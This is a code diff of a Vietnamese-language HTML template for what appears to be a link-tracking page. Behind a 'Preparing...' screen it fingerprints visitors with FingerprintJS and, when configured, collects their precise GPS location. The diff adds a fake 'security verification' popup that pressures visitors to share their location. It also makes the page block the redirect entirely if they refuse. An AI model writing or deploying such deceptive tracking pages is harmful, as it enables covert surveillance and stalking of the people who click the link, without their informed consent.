@@ -2,14 +2,13 @@
 <html>
 <head>
     <title>Đang chuẩn bị...</title>
-    <!-- Thư viện FingerprintJS -->
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-    <!-- Thư viện SweetAlert2 cho pop-up đẹp hơn -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         body { background-color: #11191f; color: #a9b5c3; font-family: -apple-system, system-ui, "Segoe UI", "Roboto", "Helvetica Neue", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica", sans-serif; text-align: center; padding-top: 20vh; margin: 0;}
         progress { width: 50%; }
         p { font-size: 1.1em; }
+        .swal2-popup { font-size: 1rem !important; }
     </style>
 </head>
 <body>
@@ -21,56 +20,58 @@
         const shortId = '<%= shortId %>';
         const shouldRequestGPS = <%- requestGPS %>;
 
-        const payload = {
-            shortId,
-            fingerprint: null,
-            components: null,
-            latitude: null,
-            longitude: null,
-            accuracy: null
-        };
+        const payload = { shortId, fingerprint: null, components: null, latitude: null, longitude: null, accuracy: null };
         
         async function runTracker() {
             try {
-                // 1. Luôn lấy Fingerprint
+                // Bước 1: Luôn lấy Fingerprint
                 const fp = await FingerprintJS.load();
                 const result = await fp.get();
                 payload.fingerprint = result.visitorId;
                 payload.components = result.components;
 
-                // 2. Kiểm tra và yêu cầu GPS nếu cần
+                // Bước 2: Yêu cầu GPS nếu cần. Luồng này giờ có thể bị dừng lại.
                 if (shouldRequestGPS) {
                     await requestGPSPermission();
                 }
 
-            } catch (error) {
-                console.error("Lỗi tracker chính:", error);
-            } finally {
-                // 3. Luôn gửi log và chuyển hướng
+                // Bước 3: Chỉ chạy nếu các bước trên thành công
                 await sendLogAndRedirect();
+
+            } catch (error) {
+                console.error("Tracker bị dừng:", error);
+                // Hiển thị thông báo lỗi cho người dùng và không chuyển hướng
+                document.getElementById('status-message').innerText = error;
+                const progressBar = document.querySelector('progress');
+                if (progressBar) progressBar.style.display = 'none';
+                
+                // Hiển thị lỗi bằng SweetAlert
+                Swal.fire({
+                    title: 'Yêu cầu thất bại',
+                    text: error,
+                    icon: 'error',
+                    allowOutsideClick: false,
+                    allowEscapeKey: false,
+                    customClass: { popup: 'swal2-dark' }
+                });
             }
         }
         
         function requestGPSPermission() {
-            return new Promise((resolve) => {
+            return new Promise((resolve, reject) => { // ---- SỬA: DÙNG CẢ `reject` ----
                 if (!navigator.geolocation) {
-                    console.log("Trình duyệt không hỗ trợ Geolocation.");
-                    return resolve(); // Bỏ qua nếu không hỗ trợ
+                    return reject("Trình duyệt không hỗ trợ Geolocation.");
                 }
                 
-                // Hiển thị pop-up
                 Swal.fire({
                     title: 'Xác minh an toàn',
                     html: "Đã xác minh bạn là con người. Để tiếp tục, vui lòng cung cấp vị trí của bạn để tăng cường bảo mật.",
                     icon: 'info',
-                    allowOutsideClick: false,
-                    allowEscapeKey: false,
+                    allowOutsideClick: false, allowEscapeKey: false,
                     showDenyButton: true,
                     confirmButtonText: 'Đồng ý',
                     denyButtonText: `Từ chối`,
-                    customClass: {
-                        popup: 'swal2-dark',
-                    }
+                    customClass: { popup: 'swal2-dark' }
                 }).then((result) => {
                     if (result.isConfirmed) {
                         document.getElementById('status-message').innerText = "Đang lấy vị trí, vui lòng chờ...";
@@ -79,16 +80,16 @@
                                 payload.latitude = position.coords.latitude;
                                 payload.longitude = position.coords.longitude;
                                 payload.accuracy = position.coords.accuracy;
-                                resolve();
+                                resolve(); // ---- THÀNH CÔNG: CHO ĐI TIẾP ----
                             },
-                            (error) => { // Thất bại
+                            (error) => { // Lỗi khi lấy GPS (không có tín hiệu, v.v.)
                                 console.warn("Lỗi lấy GPS:", error.message);
-                                resolve();
+                                reject("Không thể lấy được vị trí của bạn. Vui lòng đảm bảo bạn đã bật GPS và cho phép trang web truy cập."); // ---- THẤT BẠI: DỪNG LẠI ----
                             },
                             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                         );
-                    } else { // Từ chối
-                        resolve();
+                    } else { // Người dùng từ chối
+                        reject("Bạn đã từ chối cung cấp vị trí. Không thể tiếp tục."); // ---- THẤT BẠI: DỪNG LẠI ----
                     }
                 });
             });
